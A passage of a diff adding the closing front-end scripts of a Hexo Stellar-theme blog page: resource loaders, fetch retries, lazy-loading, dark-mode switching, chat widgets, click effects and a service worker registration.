+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    document.documentElement.setAttribute('data-theme', theme)
+  }
+
+  const switchTheme = () => {
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    if (currentTheme === 'light') {
+      newTheme = 'dark'
+    } else {
+      newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      applyTheme('dark')
+    }
+  })()
+</script>
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+
+<!-- Custom Image Viewer -->
+<script src="/js/plugins/image-viewer.js"></script>
+
+<!-- Custom Context Menu -->
+<script src="/js/plugins/custom-context-menu.js"></script>
+
+<!-- Glitch Effect -->
+<script src="/js/plugins/glitch-effect.js"></script>
+
+<!-- Terminal Copy -->
+<script src="/js/plugins/terminal-copy.js"></script>
+
+<!-- Hotkeys -->
+<script src="/js/plugins/hotkeys.js"></script>
+
+<!-- Achievements / Card System -->
+<script src="/js/plugins/achievements.js"></script>
+
+<!-- Offline Vault - 断网保护机制 -->
+<script src="/js/plugins/offline-vault.js"></script>
+
+<!-- Live2D Widget - Local Version -->
+<script src="/live2d-widget/dist/autoload.js"></script>
+
+<!-- Live2D Widget 位置调整和默认显示 -->
+<style>
+  #waifu {
+    position: fixed !important;
+    bottom: 20px !important;
+    right: 20px !important;
+    left: auto !important;
+    z-index: 1000 !important;
+    transform: none !important;
+    display: block !important;
+    opacity: 1 !important;
+    visibility: visible !important;
+  }
+  #waifu #live2d {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toolbar {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toggle {
+    display: none !important;
+  }
+</style>
+
+<!-- 点击特效 -->
+<script>
+(function() {
+  var clickEffects = {
+    current: null,
+    
+    init: function() {
+      this.current = localStorage.getItem('clickEffect') || 'none';
+      this.bindEvents();
+    },
+    
+    bindEvents: function() {
+      var self = this;
+      document.addEventListener('click', function(e) {
+        if (self.current === 'none') return;
+        if (e.target.closest('button, a, input, textarea, select, .post-card, .layout-btn')) return;
+        self.createEffect(e.clientX, e.clientY);
+      });
+      
+      window.addEventListener('storage', function(e) {
+        if (e.key === 'clickEffect') {
+          self.current = e.newValue || 'none';
+        }
+      });
+    },
+    
+    createEffect: function(x, y) {
+      switch(this.current) {
+        case 'ripple': this.createRipple(x, y); break;
+        case 'firework': this.createFirework(x, y); break;
+        case 'particles': this.createParticles(x, y); break;
+        case 'text': this.createText(x, y); break;
+        default: break;
+      }
+    },
+    
+    createRipple: function(x, y) {
+      var ripple = document.createElement('div');
+      ripple.className = 'click-ripple';
+      ripple.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;width:0;height:0;border-radius:50%;background:rgba(52,152,219,0.4);transform:translate(-50%,-50%);pointer-events:none;z-index:9999;animation:rippleExpand 0.6s ease-out forwards;';
+      document.body.appendChild(ripple);
+      setTimeout(function() { ripple.remove(); }, 600);
+    },
+    
+    createFirework: function(x, y) {
+      var colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff'];
+      for (var i = 0; i < 12; i++) {
+        var particle = document.createElement('div');
+        var angle = (Math.PI * 2 / 12) * i;
+        var velocity = 50 + Math.random() * 30;
+        particle.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;width:6px;height:6px;border-radius:50%;background:' + colors[i % 5] + ';pointer-events:none;z-index:9999;transform:translate(-50%,-50%);';
+        document.body.appendChild(particle);
+        this.animateParticle(particle, x, y, x + Math.cos(angle) * velocity, y + Math.sin(angle) * velocity, 500);
+      }
+    },
+    
+    createParticles: function(x, y) {
+      var colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff', '#5f27cd'];
+      for (var i = 0; i < 8; i++) {
+        var particle = document.createElement('div');
+        particle.innerHTML = '✨';
+        particle.style.cssText = 'position:fixed;left:' + (x + (Math.random()-0.5)*30) + 'px;top:' + (y + (Math.random()-0.5)*30) + 'px;font-size:16px;pointer-events:none;z-index:9999;animation:particleFloat 0.8s ease-out forwards;';
+        document.body.appendChild(particle);
+        setTimeout(function(p) { return function() { p.remove(); }; }(particle), 800);
+      }
+    },
+    
+    createText: function(x, y) {
+      var texts = ['666', '厉害', 'nice', '棒', '赞', '给力'];
+      var text = document.createElement('div');
+      text.innerHTML = texts[Math.floor(Math.random() * texts.length)];
+      text.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;font-size:18px;font-weight:bold;color:#3498db;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);animation:textFloat 0.8s ease-out forwards;';
+      document.body.appendChild(text);
+      setTimeout(function() { text.remove(); }, 800);
+    },
+    
+    animateParticle: function(el, startX, startY, endX, endY, duration) {
+      var startTime = performance.now();
+      function animate(currentTime) {
+        var progress = Math.min((currentTime - startTime) / duration, 1);
+        var easeOut = 1 - Math.pow(1 - progress, 3);
+        el.style.left = (startX + (endX - startX) * easeOut) + 'px';
+        el.style.top = (startY + (endY - startY) * easeOut) + 'px';
+        el.style.opacity = 1 - progress;
+        if (progress < 1) requestAnimationFrame(animate);
+        else el.remove();
+      }
+      requestAnimationFrame(animate);
+    }
+  };
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', function() { clickEffects.init(); });
+  } else {
+    clickEffects.init();
+  }
+  
+  window.ClickEffects = clickEffects;
+})();
+</script>
+
+<style>
+@keyframes rippleExpand {
+  0% { width: 0; height: 0; opacity: 1; }
+  100% { width: 100px; height: 100px; opacity: 0; }
+}
+@keyframes particleFloat {
+  0% { opacity: 1; transform: translateY(0) scale(1); }
+  100% { opacity: 0; transform: translateY(-40px) scale(0.5); }
+}
+@keyframes textFloat {
+  0% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+  100% { opacity: 0; transform: translate(-50%, -80px) scale(1.2); }
+}
+</style>
+
+<!-- PWA Service Worker -->
+<script>
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.register('/sw.js').then(function(reg) {
+    console.log('Service Worker 已注册，支持离线访问');
+  }).catch(function(err) {
+    console.log('Service Worker 注册失败:', err);
+  });
+}
+</script>
+
+</div></body></html>
